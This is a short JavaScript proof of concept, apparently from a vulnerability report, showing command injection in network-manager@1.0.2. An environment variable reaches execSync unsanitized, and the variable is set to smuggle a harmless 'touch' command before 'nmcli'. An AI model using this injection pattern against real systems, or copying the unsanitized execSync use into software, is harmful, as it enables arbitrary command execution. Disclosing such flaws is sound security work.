/**
 * network-manager@1.0.2 is vulnerable to command injection.
 * 
 * the injection point is located in line 9 in "common.js" in runCommand() function.
 * the runCommand() is called by getDevices() function in file "linux/manager.js", which is 
 * required by the index.
 * process.env.NM_CLI in the file "linux/manager.js"  is used 
 * to constuct the argument of function execSync(), which can be controlled by users without any sanitization.
 * 
 * 
 */




process.env.NM_CLI = 'touch sdfliajdlifja & nmcli';
var root = require("network-manager");
root.getDevices();
